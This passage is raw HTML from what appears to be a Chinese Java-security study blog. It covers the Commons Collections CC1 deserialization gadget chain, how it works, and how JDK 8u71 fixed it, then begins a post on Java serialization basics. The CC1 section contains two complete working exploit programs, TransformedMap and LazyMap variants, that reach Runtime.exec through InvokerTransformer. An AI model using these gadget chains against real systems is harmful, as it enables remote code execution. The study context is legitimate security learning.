<span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="1-4-最终-POC-："><a href="#1-4-最终-POC-：" class="headerlink" title="1.4 最终 POC ："></a>1.4 最终 POC ：</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span> , chainedTransformer);<br><br>        Class&lt;?&gt; c1 = Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        Constructor&lt;?&gt; constructor = c1.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Target.class, transformedMap);<br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808016.png"></p><h3 id="1-5-总结"><a href="#1-5-总结" class="headerlink" title="1.5 总结"></a>1.5 总结</h3><p><code>transform</code> 方法，可以把一个对象转换成另一个对象， 但是，在实现类里把 <code>transform</code> 变成“可以执行任意逻辑”时，就出现了漏洞。我们发现 <code>InvokerTransformer</code> 实现了 <code>Transformer</code> 接口并且有 <code>transform</code> 方法，</p><p>接着找到 <code>TransformedMap</code> 类中的 <code>checkSetValue</code> 方法调用了 <code>transform</code> 方法；</p><p>之后找到 <code>AbstractInputCheckedMapDecorator</code> 类中的 <code>setValue</code> 方法调用了 <code>checkSetValue</code>方法，</p><p>通过测试这条链是没问题的，那么接下来的目标就是寻找一个入口点 ，查找哪个方法调用了 <code>setValue</code> ，最好是重写的 <code>readObject</code>，通过 <code>readObject</code> 来触发漏洞。</p><p>找到 <code>AnnotationInvocationHandler</code> 类中的 <code>readObject</code> 方法存在 <code>setValue</code>，需要注意的是 <code>readObject</code> 不是直接调用 ·，</p><p><code>readObject</code> 方法在反序列化时，会从序列化数据中恢复 <code>memberValues</code>（一个 <code>Map</code>），而这个 <code>Map</code> 的内容完全取决于攻击者传入的序列化流。攻击者可以在这里替换成 <code>TransformedMap</code>，从而把恶意 <code>Transformer</code> 链接进来。</p><p>通过对 <code>readObject</code> 的调试，知道了 <code>readObject</code> 如何触发 <code>setValue</code> ：</p><p>在反序列化时，<code>AnnotationInvocationHandler.readObject</code> 会去恢复 <code>memberValues</code> 里的数据。它遍历 <code>memberValues.entrySet()</code> 时，取到的 <code>MapEntry</code> 会调用 <code>setValue</code> 来写入值。也就是说：反序列化时，<code>readObject</code> 间接触发了 <code>MapEntry.setValue</code>。 </p><p><strong>完整的利用链思路：</strong></p><p> AnnotationInvocationHandler.readObject</p><p>memberValue.setValue</p><p>MapEntry.setValue</p><p>parent.checkSetValue</p><p>TransformedMap.checkSetValue</p><p>valueTransform.transform</p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808194.png"></p><p><code>readObject</code> 在反序列化时会恢复 <code>memberValues</code>（一个 <code>Map</code>）,</p><p>由于攻击者可控，这个 <code>Map</code> 可以被替换为 <code>TransformedMap</code>，</p><p>当 <code>readObject</code> 遍历 <code>memberValues.entrySet()</code> 时，会触发 <code>MapEntry.setValue</code>，</p><p><code>setValue</code> 会调用 <code>checkSetValue</code>，而 <code>checkSetValue</code> 又会调用 <code>valueTransform.transform</code>，</p><p>这里的 <code>valueTransform</code> 实际上是 <code>ChainedTransformer</code>，它会依次执行其中的 <code>ConstantTransformer</code> 和 <code>InvokerTransformer</code>，</p><p>最终 <code>InvokerTransformer.transform</code> 会调用任意方法，从而实现代码执行。</p><h2 id="2、-LazyMap-版"><a href="#2、-LazyMap-版" class="headerlink" title="2、 LazyMap 版"></a>2、 LazyMap 版</h2><h3 id="2-1-分析利用链"><a href="#2-1-分析利用链" class="headerlink" title="2.1 分析利用链"></a>2.1 分析利用链</h3><p>首先找到 LazyMap 类中的 get 方法中有 <font style="color:#080808;background-color:#ffffff;">transform 方法。</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808665.png"></p><p>找 factory ：<font style="color:#080808;background-color:#ffffff;">Transformer</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808064.png"></p><p>由于此处的构造方法同样为 protected ，还是利用静态方法 decorate 传参</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808653.png"></p><p>继续找谁调用了 LayMap.get() </p><p>在 <font style="color:#080808;background-color:#ffffff;">AnnotationInvocationHandler 类中的 invoke 方法调用了 get</font></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311808079.png"></p><p>同时这个类也有 TransformedMap 中用到的 readObject 方法 </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311809084.png"></p><p><font style="color:rgb(44, 62, 80);">要触发 AnnotationInvocationHander.invoke，用到动态代理</font></p><h3 id="2-2-编写-EXP"><a href="#2-2-编写-EXP" class="headerlink" title="2.2 编写 EXP"></a>2.2 编写 EXP</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Retention;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationTargetException;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC1Test02</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> ClassNotFoundException, NoSuchMethodException, IOException, InvocationTargetException, InstantiationException, IllegalAccessException &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-comment">//chainedTransformer.transform(Runtime.class);</span><br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-comment">//首先用 LazyMap 替换 TransformedMap</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(map, chainedTransformer);<br><br>        <span class="hljs-comment">//对 sun.reflect.annotation.AnnotationInvocationHandler 对象进行 Proxy</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> clazz.getDeclaredConstructor(Class.class, Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-comment">//利用反射创建了一个 AnnotationInvocationHandler 对象；它内部的 memberValues 是 LazyMap</span><br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">handler</span> <span class="hljs-operator">=</span> (InvocationHandler) constructor.newInstance(Retention.class, lazyMap);<br><br>        <span class="hljs-comment">//创建动态代理对象 proxyMap，当有人对这个 proxyMap 调用 Map 的任意方法，会进入 AnnotationInvocationHandler.invoke(...)</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">proxyMap</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Map.class&#125;, handler);<br><br>        <span class="hljs-comment">//因为 proxyMap 自己序列化 /反序列化不会触发链子；只有 AnnotationInvocationHandler 的反序列化过程才会去主动访问 memberValues</span><br>        <span class="hljs-comment">//把 proxyMap 塞进一个新的 AnnotationInvocationHandler 的 memberValues 字段里，让它在 readObject() 时被调用</span><br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Retention.class, proxyMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810087.png"></p><h3 id="2-3-问题"><a href="#2-3-问题" class="headerlink" title="2.3 问题"></a>2.3 问题</h3><ol><li>未执行到 readObject 就弹出计算器</li></ol><blockquote><p>《Java 安全漫谈》</p><p>在使用Proxy代理了map对象后，我们在任何地方执行map的方法就会触发Payload弹出计算器，所</p><p>以，在本地调试代码的时候，因为调试器会在下面调用一些toString之类的方法，导致不经意间触发了</p><p>命令。</p></blockquote><p>解决办法有 ：</p><p>设置 - 构建、执行、部署 - 调试器 - 数据视图 - Java</p><p>关闭：</p><p>启用集合类的替代视图</p><p>启用’toStringO’对象视图</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810304.png"></p><h3 id="2-4-总结"><a href="#2-4-总结" class="headerlink" title="2.4 总结"></a>2.4 总结</h3><p>漏洞原理：</p><ul><li><code>LazyMap.decorate(Map, Transformer)</code> 包装一个底层 Map。</li><li>当调用 <code>get(key)</code> 时，如果 <code>key</code> 不存在，就会调用 <code>transformer.transform(key)</code> 生成值并返回</li></ul><p>利用链：</p><p>AnnotationInvocationHandler.readObject</p><p>AnnotationInvocationHandler.invoke</p><p>memberValues.get</p><p>LazyMap.get</p><p>LazyMap.get.factor.<font style="color:rgb(44, 62, 80);">transform</font></p><p>ChainedTransformer.transform</p><p>ConstantTransformer.transform</p><p>InvokerTransformer.transform  </p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810272.png"></p><h1 id="漏洞修复："><a href="#漏洞修复：" class="headerlink" title="漏洞修复："></a>漏洞修复：</h1><h2 id="1、TransformedMap"><a href="#1、TransformedMap" class="headerlink" title="1、TransformedMap"></a>1、TransformedMap</h2><p>TransformedMap 在 Java 8u71 以上的版本就不可以使用了。</p><p>首先梳理一下 TransformedMap 利用链的逻辑：</p><p><code>TransformedMap.decorate</code> 包装了一个 <code>Map</code>，并设置了一个恶意 <code>Transformer</code>，<code>TransformedMap</code> 在调用<code>Map.Entry.setValue</code> 的时候，会触发 <code>transformer.transform(value)</code>，在 gadget 链里，利用 <code>AnnotationInvocationHandler</code> 的反序列化逻辑，最终会调用到 <code>Map.Entry.setValue</code>，触发恶意代码。</p><p>而利用 <code>AnnotationInvocationHandler</code> 主要用的是 <code>readObject</code>方法的反序列化操作，</p><ul><li>在  Java 8u71 之前：</li></ul><p><code>readObject</code>方法在反序列化时会遍历 <code>Map</code> 中的 <code>entry</code>，调用 <code>entry.setValue()</code> 来调整键值。于是恶意的 <code>TransformedMap entry</code> 会被调用 <code>setValue</code>，从而执行 <code>transform()</code>。</p><ul><li>在 Java 8u71 之后：</li></ul><p><a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/f8a528d0379d</a></p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810069.png"></p><p> 新建一个<code>LinkedHashMap</code>，对值的修正，改成了 <code>value = new ...</code>，而不是直接调用<code>entry.setValue</code>，后续的操作都是针对<code>LinkedHashMap</code>。这样一来，<code>streamVals</code>就不会去调用 <code>setValue</code>，它只是作为一个输入被读取了一遍，然后就进入了<code>LinkedHashMap</code>，不会触发恶意方法。</p><p>所以说，漏洞的修复和 <code>setValue</code>关系不大，</p><blockquote><p>《Java 安全漫谈》</p><p>对于这次修改，有些文章说是因为没有了setValue，其实原因和setValue关系不大。改动后，不再直接</p><p>使用反序列化得到的Map对象，而是新建了一个LinkedHashMap对象，并将原来的键值添加进去。</p><p>所以，后续对Map的操作都是基于这个新的LinkedHashMap对象，而原来我们精心构造的Map不再执</p><p>行set或put操作，也就不会触发RCE了。</p></blockquote><h2 id="2、-LazyMap"><a href="#2、-LazyMap" class="headerlink" title="2、 LazyMap"></a>2、 LazyMap</h2><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311810672.png"></p><p>原来 <code>readObject</code> 会通过 <code>memberValues.get(name)</code> 或者 <code>entry.setValue(...)</code> 间接调用 <code>Map</code> 的查找&#x2F;写入方法，现在改为遍历反序列化出来的 <code>streamVals.entrySet()</code>、直接读取 <code>entry.getValue()</code> 并把值复制到一个新的 <code>LinkedHashMap</code>，然后用 <code>Unsafe</code>  直接在内存里把对象字段的引用一次性写入  。这样就切断了触发 LazyMap.transform 的路径。  </p>]]></content>
    
    
    <categories>
      
      <category>Java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java 学习</tag>
      
      <tag>CC链</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java 反序列化学习</title>
    <link href="/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2025/08/26/Java%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<h1 id="Java-反序列化"><a href="#Java-反序列化" class="headerlink" title="Java 反序列化"></a>Java 反序列化</h1><h1 id="1、序列化与反序列化"><a href="#1、序列化与反序列化" class="headerlink" title="1、序列化与反序列化"></a>1、序列化与反序列化</h1><h2 id="1-1-什么是序列化-反序列化"><a href="#1-1-什么是序列化-反序列化" class="headerlink" title="1.1 什么是序列化&amp;反序列化"></a>1.1 什么是序列化&amp;反序列化</h2><p>序列化：将内存中的对象压缩成字节流<br>反序列化：将字节流转化成内存中的对象</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508311749235.png"></p><h2 id="1-2-为什么有序列化技术"><a href="#1-2-为什么有序列化技术" class="headerlink" title="1.2 为什么有序列化技术"></a>1.2 为什么有序列化技术</h2><p>序列化与反序列化的设计就是用来传输数据的。</p><p><strong>应用场景</strong><br>(1) 想把内存中的对象保存到一个文件中或者是数据库当中。<br>(2) 用套接字在网络上传输对象。<br>(3) 通过RMI传输对象的时候。</p><h2 id="1-3-几种常见的序列化和反序列化协议"><a href="#1-3-几种常见的序列化和反序列化协议" class="headerlink" title="1.3 几种常见的序列化和反序列化协议"></a>1.3 几种常见的序列化和反序列化协议</h2><ul><li>XML</li><li>SOAP（Simple Object Access protocol） 是一种被广泛应用的，基于 XML 为序列化和反序列化协议的结构化消息传递协议</li><li>JSON（Javascript Object Notation）</li><li>Protobuf</li></ul><h2 id="1-4-序列化和反序列化实现"><a href="#1-4-序列化和反序列化实现" class="headerlink" title="1.4 序列化和反序列化实现"></a>1.4 序列化和反序列化实现</h2><p>简单分析 Java 的对象序列化的不同写法：</p><p>俩种写法本质上都是 Java 的对象序列化，但它们在底层的 IO 流使用方式上略有不同：</p><p><strong>写法一：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));<br></code></pre></td></tr></table></figure><p>传统的基于字节流的文件写入方式：FileOutputStream(“ser.bin”)， 创建一个 <code>FileOutputStream</code>，表示要写入的目标文件是 <code>ser.bin</code></p><p>特点：</p><ul><li>简单直接，兼容性很好，Java 早期版本就有。</li><li>对路径和文件名使用的是 <strong>字符串形式</strong>。</li></ul><p><strong>写法二：（IDEA推荐）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">ObjectOutputStream oos = new ObjectOutputStream(Files.newOutputStream(Paths.get(&quot;ser.bin&quot;)));<br></code></pre></td></tr></table></figure><p><code>**Paths.get(&quot;ser.bin&quot;)**</code></p><ul><li>使用 <code>java.nio.file.Path</code> 来表示文件路径，比 <code>String</code> 更灵活、可组合。</li><li>可以方便地处理跨平台路径，比如 <code>&quot;folder/subfolder/file.txt&quot;</code></li></ul><p><code>**Files.newOutputStream(path)**</code></p><ul><li>返回一个 <code>OutputStream</code>，功能类似 <code>FileOutputStream</code>。</li><li>基于 NIO（New IO）库，提供更多文件操作选项，</li></ul><p>特点：</p><ul><li>更现代化的写法，灵活性高，支持 NIO 的各种特性。</li><li>更适合与 <code>Path</code>、<code>Files</code> API 配合，比如检查文件是否存在、创建目录等。</li></ul><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.Serializable;<br><br><span class="hljs-comment">//定义一个 Person 类，并声明它实现了 Serializable 接口,这样 Person 的对象就可以被序列化</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Serializable</span> &#123;<br><br>    <span class="hljs-comment">//私有成员变量</span><br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br><br>    <span class="hljs-comment">//无参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span> &#123;&#125;<br><br>    <span class="hljs-comment">//有参构造</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">(String name, <span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br><br>    <span class="hljs-comment">//重写 toString() 方法</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">toString</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>        <span class="hljs-string">&quot;name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>        <span class="hljs-string">&quot;, age=&quot;</span> + age +<br>        <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span 